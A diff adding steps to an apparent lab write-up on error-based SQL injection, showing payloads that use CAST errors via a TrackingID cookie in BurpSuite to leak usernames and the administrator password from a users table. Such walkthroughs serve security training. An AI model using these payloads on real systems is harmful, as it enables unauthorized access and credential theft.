@@ -36,3 +36,34 @@ The database contains a different table called users, with columns called userna
 ' AND 1=CAST((SELECT 1)AS int)--
 ```
 
+### Checking Users
+
+- Sending us the below payload gives us an error and if you check the error carefully our query got truncated.
+
+```sql
+' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+
+
+![Image3](./Images/img3.png)
+
+- So delete the `TrackingID` portion in the BurpSuite query and then send the below payload but this time no `TrackingID`.
+
+```sql
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+![Image4](./Images/img4.png)
+
+- This proves we have an `administrator` user in the `users` table of the database.
+
+### Finding Password
+
+- The below payload helps us get the `administrator` password.
+
+```sql
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+![Solved](./Images/img5.png)
+
